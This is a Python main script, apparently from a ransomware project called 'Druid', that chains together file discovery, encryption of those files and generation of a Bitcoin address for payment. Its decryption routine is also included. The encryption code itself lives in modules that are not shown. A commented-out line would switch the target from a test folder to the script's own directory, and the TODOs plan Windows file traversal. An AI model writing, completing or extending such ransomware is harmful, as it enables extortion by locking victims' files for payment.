import logging
from encrypt_files import start_encryption
from decrypt_files import start_decryption
from utils import get_files_to_be_encrypted, generate_bitcoin_address

logging.basicConfig(
    format="%(asctime)s %(module)s %(levelname)s: %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# TODO: Find a better way to store the configuration variables
# TODO: Solve the relative path issue while acessing files
# TODO: Add exception handling
# TODO: Implement Windows file traversal logic
# TODO: Add explicit garbage collection
# TODO: Add Comprehensive Logging
# TODO: Add double encryption protection


def encrypt_button_handler():
    logger.info("ENCRYPTION STARTED")
    current_directory = "/Users/surya/Desktop/Druid/encrypt_test"
    # current_directory = os.path.dirname(os.path.abspath(__file__))
    list_of_files_to_be_encrypted = get_files_to_be_encrypted(current_directory)
    start_encryption(list_of_files_to_be_encrypted)
    generate_bitcoin_address()
    logger.info("ENCRYPTION DONE")


def decrypt_button_handler():
    logger.info("DECRYPTION STARTED")
    start_decryption()
    logger.info("DECRYPTION DONE")


if __name__ == "__main__":
    encrypt_button_handler()
    decrypt_button_handler()
